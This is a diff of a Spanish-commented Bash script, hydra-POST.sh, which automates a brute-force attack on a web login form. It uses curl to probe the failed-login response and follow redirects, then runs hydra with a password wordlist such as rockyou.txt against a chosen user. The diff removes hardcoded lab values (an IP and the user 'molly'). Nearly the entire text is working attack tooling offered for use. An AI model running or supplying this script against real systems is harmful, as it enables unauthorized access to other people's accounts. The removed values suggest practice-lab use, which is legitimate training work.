@@ -17,7 +17,6 @@
 # Bajar y editar directamente el archivo en nano
 #   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | nano -
 # ----------
-
 vIP="$1"
 vSubURL="$2"
 vUserField="$3"
@@ -25,37 +24,54 @@ vPassField="$4"
 vUsuario="$5"
 vUbicDicc="$6"
 
-
-vIP='10.10.179.150'
-vSubURL='/login'
-vUserField='username'
-vPassField='password'
-vUsuario='molly'
-vUbicDicc='/home/nipegun/Descargas/rockyou.txt'
-
-# Determinar el código de error
-  vErrorCode=$(curl -i -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL" | grep HTTP | grep Found | cut -d' ' -f2)
-  echo ""
-  echo ""
-  echo ""
-
-# Determinar el texto de error
-  vErrorText=$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL" | cut -d' ' -f2)
-
-# Mostrar mensajes con error
+# Determinar el código HTML que devuelve un login fallido
+  # Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
+    if [[ $(dpkg-query -s curl 2>/dev/null | grep installed) == "" ]]; then
+      echo ""
+      echo -e "${cColorRojo}  El paquete curl no está instalado. Iniciando su instalación...${cFinColor}"
+      echo ""
+      sudo apt-get -y update
+      sudo apt-get -y install curl
+      echo ""
+    fi
+  vErrorCode=$(curl -i -s -X POST -d "$vUserField=NiPeGunXXX&$vPassField=NiPeGunXXX"   http://"$vIP""$vSubURL" | grep HTTP | grep Found | cut -d' ' -f2)
   echo ""
   echo "  El código que devuelve la web al introducir credenciales incorrectas es:"
   echo ""
   echo "    $vErrorCode"
   echo ""
-  echo "  El texto que devuelve la web al introducir credenciales incorrectas es:"
-  echo ""
-  echo "    $vErrorText"
-  echo ""
+
+# Determinar el texto resultante del error de inicio de sesión
+  if [[ "$vErrorCode" =~ ^30[0-9]$ ]]; then # Si hay redirección (30x) -> seguirla con -L y cookie jar
+    vJar="$(mktemp)"
+    vWebResultanteDespRedir="$(curl -s -L -c "$vJar" -b "$vJar" -H 'Content-Type: application/x-www-form-urlencoded' --data "$vUserField=NiPeGunXXX&$vPassField=NiPeGunXXX" "http://${vIP}${vSubURL}")"
+    rm -f "$vJar"
+    echo ""
+    echo "    La web resultante de seguir la redirección $vErrorCode es esta:"
+    echo ""
+    echo "$vWebResultanteDespRedir"
+    echo ""
+    echo "    Renderizada:"
+    echo ""
+    # Renderizar la web resultante a texto y guardarla en una variable
+      # Comprobar si el paquete w3m está instalado. Si no lo está, instalarlo.
+        if [[ $(dpkg-query -s w3m 2>/dev/null | grep installed) == "" ]]; then
+          echo ""
+          echo -e "${cColorRojo}  El paquete w3m no está instalado. Iniciando su instalación...${cFinColor}"
+          echo ""
+          sudo apt-get -y update
+          sudo apt-get -y install w3m
+          echo ""
+        fi
+      vWebRenderizada=$(echo "$vWebResultanteDespRedir" | w3m -T text/html -dump)
+    echo "$vWebRenderizada"
+    vErrorText=$(echo "$vWebRenderizada" | grep -i -E "incorrect|wrong")
+  else
+    vErrorText="$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL")"
+  fi
 
 # Atacar
   echo ""
   echo "  Probando ataque de fuerza bruta..."
   echo ""
-  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:S=$vErrorCode" -V
-  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:F=$vErrorText" -V
+  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:F=$vErrorText"
